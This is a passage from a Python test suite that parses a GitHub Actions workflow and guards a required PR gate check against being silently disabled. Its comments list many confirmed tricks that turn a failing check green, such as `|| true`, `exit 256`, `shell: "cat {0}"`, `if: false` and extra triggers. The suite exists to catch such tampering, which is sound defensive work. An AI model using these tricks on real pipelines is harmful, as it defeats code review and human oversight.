    # restated-dependency rule, because the excluded word was supplied by the prose. Quote-aware,
    # so a `#` inside a string (`echo "a # b"`) is text and not a comment.
    def uncomment(line):
        out, quote = [], None
        for i, ch in enumerate(line):
            if quote:
                out.append(ch)
                if ch == quote:
                    quote = None
            elif ch in "\"'":
                quote = ch
                out.append(ch)
            elif ch == "#" and (i == 0 or line[i - 1] in " \t"):
                break
            else:
                out.append(ch)
        return "".join(out).rstrip()

    def strip_comments(text):
        return "\n".join(uncomment(ln) for ln in text.splitlines())

    # Enough block YAML to read this workflow's *structure*, which regexes over its text cannot.
    # A review defeated fourteen text-scoped rules at once, and every defeat exploited the gap
    # between a rule's spelling and the property it meant: `"continue-on-error": true` slipped a
    # regex over unquoted keys; `shell: "cat {0}"` made the step print the script instead of running
    # it, and the rule enumerated only two keys; `if: false` appended after the `steps:` list landed
    # outside the positional window that stood in for "the job"; a decoy job before the real one
    # truncated that window entirely. None of those is an exotic shape — they are all just *keys*,
    # which is what a parser sees and a substring cannot.
    #
    # Stdlib, because this suite declares no dependencies: the check that judges the workflow must
    # not be the one that reports MISSING-DEP and skips. It refuses anything it cannot model rather
    # than guessing, since a step whose keys the reader cannot see would satisfy every whitelist
    # below by having no visible keys at all.
    class YamlUnsupported(Exception):
        pass

    def _dequote(text):
        return text[1:-1] if len(text) > 1 and text[0] == text[-1] and text[0] in "\"'" else text

    def _parse_block(lines, i, min_indent):
        """(value, next_index) for the block starting at or after `lines[i]`.

        The block's own column is taken from its first line rather than assumed, because YAML only
        requires a child to be deeper than its parent, not deeper by a fixed amount."""
        # A sequence and a mapping cannot both start a block, so the first non-blank line decides.
        while i < len(lines) and not lines[i].strip():
            i += 1
        if i >= len(lines) or _col(lines[i]) < min_indent:
            return None, i
        indent = _col(lines[i])
        if lines[i].strip().startswith("- "):
            items = []
            while i < len(lines):
                if not lines[i].strip():
                    i += 1
                    continue
                col = _col(lines[i])
                if col < indent or not lines[i].strip().startswith("- "):
                    break
                rest = lines[i].strip()[2:]
                if rest[:1] in ("{", "["):
                    raise YamlUnsupported("flow collection in a sequence: %r" % lines[i])
                inner = col + 2
                if re.match(r"""^['"]?[\w.-]+['"]?\s*:""", rest):
                    # `- key: value` — the item is a mapping whose first key shares this line.
                    synthetic = [" " * inner + rest] + lines[i + 1:]
                    value, consumed = _parse_block(synthetic, 0, inner)
                    i = i + 1 + (consumed - 1)
                    items.append(value)
                else:
                    items.append(_dequote(rest))
                    i += 1
            return items, i
        mapping = {}
        while i < len(lines):
            if not lines[i].strip():
                i += 1
                continue
            col = _col(lines[i])
            if col < indent:
                break
            if col > indent:
                raise YamlUnsupported("unexpected indent: %r" % lines[i])
            m = re.match(r"""^['"]?([\w.$-]+)['"]?\s*:\s*(.*)$""", lines[i].strip())
            if not m:
                raise YamlUnsupported("not a mapping entry: %r" % lines[i])
            key, rest = _dequote(m.group(1)), m.group(2)
            if key in mapping:
                raise YamlUnsupported("duplicate key %r would hide the first" % key)
            if rest[:1] in ("&", "*") or rest.startswith("<<"):
                raise YamlUnsupported("anchor, alias or merge key: %r" % lines[i])
            if re.match(r"^[|>][-+]?$", rest):
                # Block scalar: every deeper line, kept raw, because it is shell and not YAML.
                body, i = [], i + 1
                while i < len(lines) and (not lines[i].strip() or _col(lines[i]) > col):
                    body.append(lines[i])
                    i += 1
                mapping[key] = "\n".join(body)
            elif rest:
                if rest[:1] == "{":
                    # A flow *sequence* value stays legal — `types: [opened, …]` is the workflow's
                    # own spelling and `flow_list` reads it. A flow *mapping* is what this reader
                    # would keep as a string, so `with: {fetch-depth: 1}` — a real defang — reached
                    # the rules as text and crashed them on `.get` instead of failing.
                    raise YamlUnsupported(
                        "flow mapping as a value, which this reader would store as a string and "
                        "every rule that indexes it would then crash on: %r" % lines[i])
                # Values are dequoted, keys already were. Without this a quoted scalar was a
                # *different string* to every pin that compares against it, so writing the job name
                # as `'Mechanical checks'` — YAML-identical — failed the rule that pins the
                # check-run name, under a message about renaming it.
                mapping[key] = None if rest in ("null", "~") else _dequote(rest)
                i += 1
            else:
                mapping[key], i = _parse_block(lines, i + 1, col + 1)
        return mapping, i

    def _col(line):
        return len(line) - len(line.lstrip())

    def parse_yaml(text):
        if "\t" in text:
            raise YamlUnsupported("tab in indentation")
        lines = [uncomment(ln) for ln in text.splitlines()
                 if ln.strip() != "---" and not ln.startswith("%")]
        value, _ = _parse_block(lines, 0, 0)
        return value or {}

    def run_contents(text):
        """Every shell line the workflow executes, whatever scalar style declared it.

        The first version matched `run: |` only. That is not a stylistic omission: a
        single-line `run: echo …` — the way anyone adds a quick step — was never collected, so
        the injection rule below did not miss such a line, it never looked at one. Folded
        (`>`, `>-`) blocks were invisible the same way. Comments are dropped because a rule
        about what the job *executes* must not be satisfiable by prose.
        """
        out, lines = [], strip_comments(text).splitlines()
        for i, line in enumerate(lines):
            opener = re.match(r"^(\s*)run:\s*(?:([|>][-+]?)\s*)?(.*)$", line)
            if not opener:
                continue
            indent, block, inline = len(opener.group(1)), opener.group(2), opener.group(3)
            if not block:
                out.append(inline)          # `run: cmd` on one line
                continue
            for nxt in lines[i + 1:]:
                if nxt.strip() and len(nxt) - len(nxt.lstrip()) <= indent:
                    break
                out.append(nxt)
        return out

    # An invocation that is not `--requirements`, because that one resolves dependencies and its exit
    # code is not a verdict. The question is narrower than "does the name appear in an executed
    # line", since `echo python …` prints the command and `… || true` throws the verdict away: it is
    # "is this the command, and does its exit status still reach the job".
    # Masking is matched against the text *following* the command, not the whole line: a line may
    # legitimately mask an unrelated command before running the real one
    # (`rm -f gate.log || true; python …pr_gate.py`), and rejecting that would make the rule fire
    # on correct code — which is how a rule gets deleted. `tail_preserves_status` below is the
    # answer; a `MASKED` regex that used to live here, listing the handler commands to refuse, is
    # described in its docstring as the blacklist that failed.

    def tokens(ln):
        """Segments and separators, alternating, honouring quotes.

        `re.split` on the operators was close enough while the rules only asked about the segment
        that *contained* a script name. It stops being close enough once every segment must name a
        permitted command, because a `;` inside `echo "a; b"` is text: splitting on it invents a
        segment whose first word is `b"`, which no whitelist would recognise and no shell ever runs.

        Backslash escapes are *not* modelled, and the first version of this docstring called that
        conservative "since the effect is to see more segments rather than fewer". That was wrong in
        the one direction that matters: `echo disabled\\; python …pr_gate.py ${SEL}` is a single echo
        to bash, and the invented second segment is an invocation the shell never runs — seeing more
        segments manufactures a command rather than missing one. So instead of modelling escapes, the
        workflow is asserted to contain none, the same way `parse_yaml` refuses what it cannot read.
        """
        out, cur, i, quote = [], "", 0, ""
        while i < len(ln):
            char = ln[i]
            if quote:
                cur += char
                quote = "" if char == quote else quote
                i += 1
            elif char in "'\"":
                cur, quote, i = cur + char, char, i + 1
            elif ln[i:i + 2] in ("&&", "||"):
                out, cur, i = out + [cur, ln[i:i + 2]], "", i + 2
            elif char == "&" and cur.rstrip().endswith(">"):
                # `2>&1` is one redirection; splitting on this `&` invented a segment `1`, so a
                # correct respelling of a permitted redirection failed the argv pins.
                cur, i = cur + char, i + 1
            elif char in ";|&":
                out, cur, i = out + [cur, char], "", i + 1
            else:
                cur, i = cur + char, i + 1
        return out + [cur]

    def parts(ln):
        """Each shell segment of a line, paired with the text that follows it."""
        pieces = tokens(ln)
        return [(pieces[i], "".join(pieces[i + 1:])) for i in range(0, len(pieces), 2)]

    def reraises(words, after_failure=True):
        """Does this `exit` hand on a failure rather than replace it with success?

        The whole point of exempting a conditional terminator is the handler
        `python … || { echo "::error::…"; exit 1; }`. Exempting on the operator alone also
        admitted `|| { echo "::error::x"; exit 0; }` — reached only when the gate has already
        failed, and then reporting success. A probe aimed at this loosening found it before it
        shipped, which is the reason to aim probes at loosenings.
        """
        arg = words[1] if len(words) > 1 else ""
        if not arg:
            # A bare `exit` inherits `$?` of the *last command run*. That made it masking in the
            # documented handler `|| { echo "::error::x"; exit; }`, where the last command is the
            # `echo` — but it is a genuine re-raise in `python … || exit`, where the last command is
            # the failing gate. Read as unconditionally masking, this refused correct code.
            #
            # Which of the two applies is exactly `after_failure`, since a later round made that the
            # sense of the operator *immediately* before the segment rather than a disjunction over the
            # line: in the handler the `exit` segment's governing separator is the `;` after the echo,
            # so `after_failure` is already false there. The branch was written before that fix and
            # kept hard-coding the answer the fix now computes. Verified in bash.
            return after_failure
        bare = arg.strip("\"'").lstrip("$").strip("{}")
        # `$?` and `$code` were one branch, and they are not the same kind of thing. `$?` is whatever
        # ran last, so it hands on the verdict only while nothing has run since; `$code` is a variable
        # that already holds it — `ALLOWED_ASSIGN` admits no spelling of `code=` other than `code=$?`,
        # and a separate rule requires that assignment to follow the invocation. Conflated, the pair
        # was wrong in both directions: `|| { echo …; exit $?; }` passed (echo's zero), and the real
        # workflow's `if [ "$code" -ne 2 ]; then exit "$code"; fi` was refused for being too far from
        # the failure it re-raises.
        if bare == "code":
            return True
        if bare == "?":
            return after_failure
        # `.isdigit()` alone read `exit -1` — a non-zero status — as masking. Any numeric
        # literal is fine as long as it is not zero; anything unparseable (`exit $((x))`) is
        # refused, which is the safe direction. Quotes are stripped first, since `exit "1"`
        # re-raises exactly as `exit 1` does and rejecting it fires on correct code.
        try:
            # `% 256` because bash truncates an exit status to 8 bits: `exit 256` and `exit 512`
            # both exit 0, so read as `int(bare) != 0` they were masking handlers this function
            # called re-raises. Verified in bash.
            return int(bare) % 256 != 0
        except ValueError:
            return False

    def tail_preserves_status(tail):
        """Can the text after a verdict-bearing invocation still let a failure reach the job?

        `MASKED` was a *blacklist* of handler commands — `true`, `:`, `echo`, `exit 0`, `&` — in a file
        that is otherwise whitelists. It was described here as the *last* such blacklist, which was
        wrong when written: `set_flags_ok` and `pip_tail_ok` were both blacklists at the time, and both
        were later found to have holes of exactly this shape and inverted for the same reason.
        `|| sleep 0` is not on it, and `sleep` is in
        `HARMLESS`, so both whitelists waved the segment through as a command the step is meant to
        run while the blacklist saw nothing to refuse: the gate ran, produced a real non-zero verdict,
        and the step exited 0. Verified in bash. Two whitelists and one blacklist disagreeing about
        the same word is where the hole was, so this is stated as the property instead:

        - `&& …` runs only on success, so on failure the line's status is the invocation's — safe.
        - `|| …` and `; …` both make the *tail's* status the line's, so the tail has to end the shell
          non-zero on the failure path. The documented correct edit
          `|| { echo "::error::…"; exit 1; }` passes; `|| sleep 0`, `|| printf ''` and every other
          non-terminating handler do not.
        - a bare `&` backgrounds the invocation, so `$?` is the fork's status — masking, and the
          sneakiest kind, since the real script really does run.

        "Ends the shell non-zero" is two questions, and the first version of this asked neither. It
        scanned for the first segment whose command was `exit` and answered `reraises()` on that
        alone, so four masking tails read as re-raising — all four verified in bash:

        - `|| echo "::error::gate failed"; exit $?` — `$?` is the *echo's* status by then, so the step
          exits 0. This is the worst shape in the set: it differs from the handler this file documents
          as correct only in a brace group, and reads like an improvement on it ("propagate the real
          status" rather than hardcoding 1).
        - `|| { echo …; exit $?; }` — the same thing inside the documented braces.
        - `|| true && exit $?` — the operator beside the terminator is `&&`, so the `exit` is reached
          only when the *handler* succeeded, and `$?` is its zero.
        - `|| { echo …; if false; then exit 1; fi; }` — a real `exit 1`, never executed.

        So the walk tracks both things: whether anything has run since the failure (which replaces
        `$?`), and whether the terminator is reached unconditionally. A control-flow opener anywhere
        in the tail ends the answer at `False` — everything after it is conditional, and an
        unreachable terminator is indistinguishable from an absent one. A handler that genuinely
        needs a conditional can be admitted here deliberately; none does today.

        The same walk fixed a false rejection in the other direction. `; exit $?` was refused, because
        `after_failure` was read off the operator as "a `;` means no failure was caught" — but
        `cmd; exit $?` propagates `cmd`'s status exactly, which bash confirms, and the idiom is a
        normal thing to write. It cost 19 spurious `[FAIL]`s when someone wrote it.
        """
        tail = tail.strip()
        if not tail:
            return True
        if re.match(r"&(?!&)", tail):
            return False
        op = tail[:2] if tail[:2] in ("||", "&&") else tail[:1]
        if op in ("&&", "|"):
            # ⚠ The `&&` premise below holds only while the `&&` list is the step's **last** command,
            # and this function is handed one line with no way to know that. Bash exempts a failing
            # left-hand side of an `&&` list from `set -e`, so the list returns non-zero *without*
            # aborting, and whatever runs next becomes the step's status. All three verified:
            #
            #   false && echo hi                 # as the last line: exit 1 — the safe case
            #   false && echo hi   ; echo x      # anything after it:  exit 0 — a failing gate, green
            #   false && exit 0    ; echo x      # exit 0 — the same hole, one word further on
            #
            # Note the second: no `exit` is involved, so refusing terminators on the `&&` branch does
            # not cover it. Lastness is the whole property, and it is a *step*-level fact — enforced
            # for every step, not just this one, by the `&&`-lastness rule near the step-key checks.
            # That rule is what this branch's `True` depends on; if it is deleted, this is a hole.
            # These two used to `return True` *before* the walk below, which meant the rewrite that
            # added the walk did not apply to them and two masking tails read as re-raising:
            #
            #   … && true; exit 0      # a command that is not last in an `&&` list is exempt from
            #                          # `set -e`, so the shell reaches the `;` and exits 0
            #   … | : || true          # the `|| true` suppresses `set -e` on the pipeline
            #
            # Both confirmed 0 in bash on a failing gate. The leading operator really is benign on
            # its own — `&&` skips its branch on the failure path, and a pipeline keeps its status
            # under `set -o pipefail` — but the text *after* it can still throw the status away, so
            # the remainder gets asked the same question instead of being waved through. Recursing
            # with a fresh `status_intact` is correct for both: nothing on the `&&` branch ran, and a
            # pipeline's own status is the verdict.
            rest = tokens(tail[len(op):])
            return tail_preserves_status("".join(rest[1:]))
        # Defensive, and unreachable from any caller today: every tail is built as
        # `"".join(pieces[i + 1:])`, so it begins with an operator or is empty, and `&`, `|`, `&&` are
        # already handled above. A tail that begins with a *command* is malformed rather than masking,
        # so `True` is the right answer for it — kept so a future caller gets that answer instead of
        # having its first word mis-read as an operator by the walk below.
        if op not in ("||", ";"):
            return True
        # `$?` holds the invocation's status immediately after it, whether the operator is `||` or
        # `;`. Any command that runs in between replaces it.
        status_intact = True
        pieces = tokens(tail[len(op):])
        for i in range(0, len(pieces), 2):
            words = pieces[i].split()
            while words and words[0] in KEYWORDS:
                words = words[1:]
            if not words:
                continue
            if words[0] in SHELL_OPENERS:
                return False
            if words[0] in TERMINATOR:
                # Reached only if the preceding segment *succeeded* — so not on the failure path.
                if i and pieces[i - 1].strip() == "&&":
                    return False
                return reraises(words, after_failure=status_intact)
            status_intact = False
        return False

    def runs_segment(seg, tail, script, args_required=()):
        """Is this one segment an invocation of `script` whose status is not thrown away?"""
        words = seg.split()
        # The first word of the segment is what runs, so `echo`/`printf`/`:`/`true` there means
        # the script is an argument rather than a command. Arguments are required *within the
        # segment*: checking them line-wide let `--pr` sit in an echo beside a real `set --`.
        # `if`/`while`/`until`/`!` consume the command's status instead of letting it reach the
        # job, so a wrapped invocation runs the real script and still cannot fail the step. The
        # literal last-command rule used to reject those by accident; once that rule became a
        # property ("one command executes the gate"), the keywords had to be named here.
        return bool(words and script in seg
                    and words[0] not in ("echo", "printf", ":", "true", "!") + SHELL_OPENERS
                    and all(a in seg for a in args_required)
                    and tail_preserves_status(tail))

    def executes(ln, script, args_required=()):
        return any(runs_segment(seg, tail, script, args_required) for seg, tail in parts(ln))

    def invocations(script, args_required=()):
        # `foreground`, because the one rule that consumes this asserts the checker *is executed* —
        # and `executes` is satisfied by `--help`/`--list`, which produce no verdict, and by a segment
        # bash skips. An existence assertion answered by a non-verdict invocation is the same defect
        # the `seen` exemption had. (`step_runs` below deliberately keeps `executes`: it identifies
        # *which* job runs the gate, where over-matching fails the "exactly one job" rule and
        # under-matching would let a second job hide.)
        return [ln for ln in run_contents(wf) if foreground(ln, script, args_required)]

    # `exit`/`return` do not mask a status, they end the shell: every command after one, on that
    # line or any later line of the step, is unreachable.
    # Keys that cannot express the threat the key rules are about, so both of them admit these.
    # `timeout-minutes` is monotonic in the safe direction — it can turn a pass into a failure, never
    # a failure into a pass. `shell` is admitted as a key and pinned to `bash` by value elsewhere,
    # since `bash` is the runner default on Linux and reinterprets nothing.
    ALSO_FINE = {"timeout-minutes", "shell", "id"}

    def opens(seg):
        return seg.split()[:1]

    def foreground(ln, script, args_required=()):
        """Whether the command *runs*, which is a different question from whether its status
        escapes. `true || python …check_branch_scope.py "$@"` satisfies `executes()` — the segment is
        a genuine invocation and the `code=$?` line still captures a status — but bash skips the
        command and the status captured is 0, so a FOREIGN or STACKED branch goes green. What makes a
        segment skippable is a *conditional* predecessor (`&&`/`||`); `;` does not, which is why the
        cleanup idiom `rm -f gate.log || true; python …` remains acceptable.

        A predecessor that *ends the shell* is the other way a permitted, unmasked command never
        runs, and the separator is irrelevant to it: `exit 0; python …pr_gate.py ${SEL}` is one
        segment that leaves nothing to run, so scanning stops there rather than continuing.
        """
        NOT_A_VERDICT = ("--list", "--requirements", "--help")
        pieces = tokens(ln)
        for i in range(0, len(pieces), 2):
            if opens(pieces[i]) and opens(pieces[i])[0] in TERMINATOR:
                return False
            if any(flag in pieces[i] for flag in NOT_A_VERDICT):
                continue
            if (pieces[i - 1].strip() if i else "") in ("&&", "||"):
                continue
            if runs_segment(pieces[i], "".join(pieces[i + 1:]), script, args_required):
                return True
        return False


    # Every textual assertion below reads the comment-stripped body. A rule about what the job
    # *does* must not be satisfiable by prose about what it does — and this file is heavily
    # commented, precisely because each setting is load-bearing. The sweep proved the point:
    # `fetch-depth: 0` is named in a comment two steps below the real setting, so flipping the
    # setting to 1 left the substring in place and the guard passed.
    body = strip_comments(wf)
    try:
        doc = parse_yaml(wf)
        parse_error = ""
    except YamlUnsupported as exc:
        doc, parse_error = {}, str(exc)
    check("the workflow is in the subset this suite can read structurally, so no key is invisible "
          "to the rules below", not parse_error, parse_error)

    # Handles both spellings of a YAML sequence, and the block form only because `str()` of the
    # parsed list happens to leave quotes that `.strip()` removes. Worth knowing before editing.
    def flow_list(scalar):
        return [w.strip().strip("'\"") for w in str(scalar).strip("[]").split(",") if w.strip()]

    # `paths:` was the filter this workflow exists to avoid, but it is not the only one that stops
    # the job running — and not running is a defect whichever way it reports (Pending for a filtered
    # workflow, success for an `if:`-skipped job). Read as keys rather than matched as text:
    # naming five forbidden filters left every other one permitted, and the quoting the rule had to
    # tolerate (`'paths':`) was a second spelling to remember. A whitelist needs neither.
    on = doc.get("on") or {}
    if isinstance(on, str):
        on = {w.strip(): None for w in on.strip("[]").split(",") if w.strip()}
    elif isinstance(on, list):
        on = {str(w): None for w in on}
    check("the trigger block is a mapping of events, the only spelling whose filters this suite can "
          "read", isinstance(doc.get("on"), dict), type(doc.get("on")).__name__)
    check("the workflow triggers on pull_request at all", "pull_request" in on, list(on))
    pr_trigger = on.get("pull_request")
    # `pull_request:` with an explicit `null`/`~` value — a legal spelling meaning "no filters" — used
    # to parse as the *string* 'null', so `set(…) - {"types"}` reported the letters n/u/l as three
    # filters and the next line crashed on `.get`. The reader now yields None for those, and anything
    # else that is not a mapping is coerced here, so the rules below always index a mapping.
    check("the pull_request trigger is a mapping of filters or has none at all, the two spellings "
          "whose filters the rules below can read",
          pr_trigger is None or isinstance(pr_trigger, dict), type(pr_trigger).__name__)
    if not isinstance(pr_trigger, dict):
        pr_trigger = {}
    # `types` is allowed only as a superset of the default three, which cannot skip a PR that the
    # default would have run. Rejecting it outright made the rule fire on a correct edit
    # (`types: [opened, synchronize, reopened, ready_for_review]`), and a rule that fires on correct
    # code is a rule someone deletes.
    DEFAULT_TYPES = {"opened", "synchronize", "reopened"}
    filters = sorted(set(pr_trigger or {}) - {"types"})
    # Driven through `flow_list` and the `or DEFAULT_TYPES` fallback, as the rule below spells it. The
    # rows used to hand-build sets and assert Python's `>=` on them, so they exercised the operator and
    # not the rule — and the fallback is the interesting part, since an unparseable `types:` silently
    # becomes "the defaults" rather than an error.
    for label, given, ok in (("the default three", "[opened, synchronize, reopened]", True),
                             ("a superset of them",
                              "[opened, synchronize, reopened, edited]", True),
                             ("a set missing one of them", "[opened, synchronize]", False),
                             # The fallback and its neighbour, which turned out to differ: an absent or
                             # empty value *is* the default three and is fine, while an unparseable one
                             # reads as a one-element set and is refused rather than quietly defaulted.
                             ("no value at all, which is the default three", "", True),
                             ("a value it cannot parse", "?!", False)):
        effective = set(flow_list(given)) or DEFAULT_TYPES
        check(f"the types rule accepts {label}" if ok else f"the types rule rejects {label}",
              (effective >= DEFAULT_TYPES) is ok, sorted(effective))
    check("the pull_request trigger carries no filter that could skip the job and read as a pass",
          not filters, filters)
    # Unconditional, like every other rule here: writing this as `if "types" in trigger:` would make
    # the suite's own check count depend on the workflow, so adding a `types:` filter would trip the
    # count invariant — whose message asks the reader to update EXPECTED, i.e. to wave the filter
    # through. Absent `types`, the effective set *is* the default, so the same assertion holds.
    types = set(flow_list((pr_trigger or {}).get("types", ""))) or DEFAULT_TYPES
    check("the trigger's event types are a superset of the default three, so no PR is skipped",
          types >= DEFAULT_TYPES, types)
    # `edited` has to be named, because the default three do not include it and it is the event fired
    # when a PR's *base branch* changes. Without it a green check run survives a retarget onto a base
    # the gate never diffed — which is a stale pass, the exact failure this whole file is about, and it
    # needs no shell trick at all: two clicks in the PR header.
    check("`edited` is among them, so retargeting the base cannot leave a stale pass behind",
          "edited" in types, sorted(types))
    # A merge queue does not replay `pull_request`. A required check with no `merge_group` trigger is
    # never reported for the queued group and the documented outcome is a failed merge, so the trigger
    # is wired ahead of anyone enabling a queue rather than discovered by it.
    check("the workflow also triggers on merge_group, so a merge queue cannot deadlock on it",
          "merge_group" in on, list(on))
    # Present is not the same as effective. `merge_group:\n  branches: [does-not-exist]` satisfies the
    # rule above and matches nothing, so the workflow never runs in the queue — which by the comment
    # in the workflow itself is a merge that cannot succeed, arrived at from a green suite. The
    # pull_request trigger gets the same treatment a few lines up, where `types` is the one filter
    # admitted and argued for.
    mg_filters = sorted(on.get("merge_group") or {})
    check("the merge_group trigger carries no filter, so it matches every queued group",
          not mg_filters, f"on.merge_group must have no keys, has {mg_filters}")
    # And nothing else, which is a whitelist for the same reason every other rule here is one. A
    # required check is satisfied by the *latest* check run of its name on the head SHA, so any
    # trigger that runs this workflow on a PR's head SHA publishes that PR's verdict. `merge_group`
    # is admitted because a queue cannot proceed without it; `workflow_dispatch` was admitted for
    # convenience and was a live bypass — dispatch on the PR branch, base ref empty, selection `--all`,
    # branch scope skipped, and the green supersedes the PR run's red. `push:` is the same hole
    # without the clicking. Enumerating the two acceptable triggers costs less than remembering which
    # of the thirty-odd others can land on a PR head SHA.
    check("the workflow triggers on nothing but those two, so no other event can publish this "
          "check's name on a PR's head SHA", set(on) == {"pull_request", "merge_group"}, sorted(on))

    # The job that runs the gate, found by what its steps do rather than by position. The rule this
    # replaces read "everything between `jobs:` and the first `- name:`" as a stand-in for the job,
    # so `if: false` appended after the steps list was outside the window, and a decoy job whose
    # first step preceded the real job's collapsed the window to nothing.
    def run_lines(step):
        """The step's executed lines, indentation preserved.

        An inline `run: cmd` scalar is stored without indentation, so `run_contents` broke out of the
        block on the first line and returned nothing — every rule that reads a step then saw an empty
        one, and a step spelled `run: id` was invisible to all of them. Defined once, above every
        caller: the first fix indented the body in `raw_shell_of` and left `step_runs` reading the raw
        scalar, so the same blind spot survived in the rule that finds the gate at all.
        """
        body = str(step.get("run", ""))
        if body and not body.startswith((" ", "\n")):
            body = "\n".join(" " * 10 + ln for ln in body.splitlines())
        return [ln for ln in run_contents("        run: |\n" + body) if ln.strip()]

    def step_runs(step, script, exclude=()):
        # Through `raw_shell_of`, which re-indents an inline `run:` scalar. Spelled out here once, it
        # read an inline step as empty — the same blind spot, fixed in one place and not the other.
        return any(executes(ln, script) and not any(x in ln for x in exclude)
                   for ln in run_lines(step))

    def job_with(script, exclude=()):
        found = [(name, job) for name, job in (doc.get("jobs") or {}).items()
                 if any(step_runs(s, script, exclude) for s in (job.get("steps") or []))]
        return found[0] if len(found) == 1 else (None, {})

    gate_job_name, gate_job = job_with("scripts/ai/pr_gate.py",
                                       exclude=("--requirements", "--list", "--help"))
    check("exactly one job runs the gate", gate_job_name, list(doc.get("jobs") or {}))
    # A whitelist of job keys, not a search for `if:`. `continue-on-error:` at job level, and
    # `defaults: {run: {shell: …}}` — which replaces the shell for *every* step in the job and so
    # needs no step edit at all — were both invisible to a rule that looked for one key.
    JOB_KEYS = {"name", "runs-on", "timeout-minutes", "steps"}
    check("the gate job carries only keys that cannot stop it running",
          not sorted(set(gate_job) - JOB_KEYS), sorted(set(gate_job) - JOB_KEYS))
    check("the workflow sets no defaults or env above the job, which would reach into every step",
          not ({"defaults", "env"} & set(doc)), sorted({"defaults", "env"} & set(doc)))
    # `exactly one job runs the gate` bounds the jobs that *invoke* the gate, not the jobs that exist.
    # A second job named `Mechanical checks` publishes a second check run under the string a branch
    # ruleset matches, which is the one name whose meaning lives outside this repo.
    # Broader than the hazard, deliberately: a job named `Docs lint` publishes `Docs lint` and
    # cannot satisfy `Mechanical checks`, so a second unrelated job is harmless *today*. What this
    # pins is that the set of check-run names this workflow publishes stays reviewed, because the
    # string a branch ruleset matches lives outside this repo: the ruleset never learns of a rename
    # here, so it goes on requiring a context nobody publishes and every PR blocks.
    # Adding a job is therefore allowed — by editing this list, which is the review.
    PUBLISHED = ["Mechanical checks"]
    published = [(j.get("name") or key) for key, j in (doc.get("jobs") or {}).items()]
    check("the workflow publishes exactly the check-run names it was reviewed with (PUBLISHED) — the "
          "job *key* is free to be renamed, since a branch ruleset matches the `name:`; add a job by "
          "adding its published name here, which is the review",
          published == PUBLISHED, published)
    # Step keys, pinned per step. Two steps had this and four did not, and the four accepted
    # `if: false`, `continue-on-error: true` and `shell:` — which replaces the interpreter for the
    # step, so the run body this suite reads word by word would be handed to something else. None of
    # the four produces a false green today (neutralising the resolver selects `--all`, and the
    # installer's absence makes `${SEL}` unbound under `set -u`), but that is an argument about the
    # rest of the file, not about the step, and it is the argument that stops being true after an edit.
    STEP_KEYS = {"Checkout repository": {"name", "uses", "with"},
                 "Set up Python": {"name", "uses", "with"},
                 "Resolve the base ref": {"name", "id", "env", "run"},
                 "Install only what the selection needs": {"name", "env", "run"},
                 "Run the gate": {"name", "run"},
                 "Branch scope": {"name", "if", "env", "run"}}
    for step in gate_job.get("steps") or []:
        name = step.get("name")
        if name not in STEP_KEYS:
            # Not "this step has extra keys": an unknown name subtracts from an empty set, so the two
            # *legal* keys were printed as the offenders. Renaming a step is harmless — only the job
            # name is load-bearing for a branch ruleset — but it has to be done in both places.
            #
            # An unnamed step is a different event and used to get the same sentence, which read
            # "None is a step name this suite was written against; rename it" — advice that cannot be
            # followed, aimed at the most ordinary Actions spelling there is (`- uses: …@v4`). Every
            # step in this job is pinned by name, so the fix is to give it one.
            check(f"every step in the job is named, since every rule here keys on the name — the step "
                  f"spelled {sorted(step)} has none"
                  if name is None else
                  f"{name!r} is a step name this suite was written against; rename it in JOB_STEPS "
                  f"and STEP_KEYS together", name is not None, sorted(STEP_KEYS))
            continue
        extra = sorted(set(step) - STEP_KEYS[name] - ALSO_FINE)
        check(f"{name!r} carries only the keys it was reviewed with (STEP_KEYS)", not extra, extra)
    # `shell` is admitted as a key and pinned by value: `bash` is the runner default on Linux and
    # reinterprets nothing, while `shell: "cat {0}"` — the documented threat, which makes the runner
    # print the script instead of executing it — is not `bash`.
    shells = {s.get("name"): s.get("shell") for s in (gate_job.get("steps") or []) if "shell" in s}
    check("any step that names a shell names bash, the runner default, and not an interpreter that "
          "would print the script instead of running it",
          all(v == "bash" for v in shells.values()), shells)
    # `timeout-minutes` is admitted because it cannot turn a failure into a pass — a cancelled job is
    # not a success. A zero, though, cancels the job every time, so the check could never pass at all.
    timeouts = {s.get("name"): s.get("timeout-minutes") for s in (gate_job.get("steps") or [])
                if "timeout-minutes" in s}
    check("a step timeout leaves the step time to run, so the check can pass at all",
          all(str(v).isdigit() and int(v) >= 5 for v in timeouts.values()), timeouts)
    # The same hazard at job scope was unasserted: `JOB_KEYS` admits `timeout-minutes` with no
    # constraint on its value, and `timeout-minutes: 1` on the job passed every assertion here while
    # cancelling the job before a checkout, a Python install, a pip install and the check matrix could
    # finish. A never-passing required check is one of the two defect directions this file exists to
    # catch, so it is not enough that it fails closed.
    check("and the job's own timeout leaves the whole matrix time to run",
          "timeout-minutes" not in gate_job
          or (str(gate_job["timeout-minutes"]).isdigit()
              and int(gate_job["timeout-minutes"]) >= 10), gate_job.get("timeout-minutes"))
    # Two loops below run once per step, so adding a step moves the total count and the invariant at
    # the bottom of this file fails with "raise EXPECTED". That is deliberate and not a derivation:
    # deriving the terms from the workflow made them self-cancel, which is how a silenced loop kept
    # the count intact. Raising the literal by hand is the review step the failure exists to force.

    # Everything above reads one line, or one substring of the whole file. Neither can see the
    # *step* around a command, and that is where most of the ways to neutralise it live: a step
    # `if:` that is never true, `continue-on-error:`, a command that is no longer last in the body,
    # or a wrapper (`if …; then`, `&`, a heredoc, `$( )`) that runs it and drops its status. A
    # review enumerated 25 such mutations after the line-scoped rules reported every mutation
    # killed — the third time in this PR that a sweep's blind spot moved instead of closing.
    #
    # So the two load-bearing steps are read as steps and pinned to *one permitted shape* each.
    # That is a whitelist, and deliberately so: a blacklist has to imagine every way to break the
    # job, while a whitelist only has to describe the one way it is allowed to work. The cost is
    # that a legitimate edit to either step must update the rule — acceptable for two steps whose
    # entire purpose is to be hard to defang, and the failure names the constraint it broke.
    #
    # The first version of that whitelist split steps with a regex on `^      - (name|uses):` and
    # asked about keys with another regex. Fourteen mutations walked through it — a quoted key, an
    # unenumerated key, a key appended after the steps list, a decoy job — so the steps now come
    # from parse_yaml above and the rules read the mapping. What the whitelist permits did not
    # change; what it can *see* did.
    # `--requirements` and `--list` are excluded because neither exit code is a verdict: a step
    # left running only one of those would satisfy "the gate runs" while checking nothing.
    def steps_named(job, script, exclude=()):
        return [s for s in (job.get("steps") or []) if step_runs(s, script, exclude)]

    raw_shell_of = run_lines

    def shell_of(step):
        return [ln.strip() for ln in raw_shell_of(step)]

    def escapes_early(step, after=None):
        """Commands at the step's own indentation that end the shell. Reachability is a property of
